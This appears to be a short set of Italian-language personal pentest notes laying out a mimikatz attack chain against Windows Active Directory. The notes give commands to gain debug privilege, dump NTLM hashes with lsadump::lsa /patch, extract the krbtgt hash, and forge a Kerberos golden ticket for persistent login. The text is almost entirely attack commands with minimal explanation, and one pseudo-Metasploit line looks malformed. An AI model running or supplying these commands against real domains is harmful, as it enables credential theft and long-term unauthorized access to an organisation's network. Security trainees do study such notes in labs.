### **ASSICURATI CHE STIA RUNNANDO COME PRIVILEGED**
```powershell
privilege::debug
```
### **DUMPA LE NTLM HASH**
```powershell
lsadump::lsa /patch
```
![file://C:/Users/STRAOL~1/AppData/Local/Temp/.HAXM41/2.png](file://C:/Users/STRAOL~1/AppData/Local/Temp/.HAXM41/2.png)
### **GOLDEN TICKET**
Crei un ticket per poter loggare quando vuoi
```MSF
golden_ticket_create //MSF
```
```MSF
lsadump::lsa /inject /name:krbtgt
```
per creare il golden ticket
```MSF
kerberos::golden /user: /domain: /sid: /krbtgt: /id:
```
![file://C:/Users/STRAOL~1/AppData/Local/Temp/.HAXM41/3.png](file://C:/Users/STRAOL~1/AppData/Local/Temp/.HAXM41/3.png)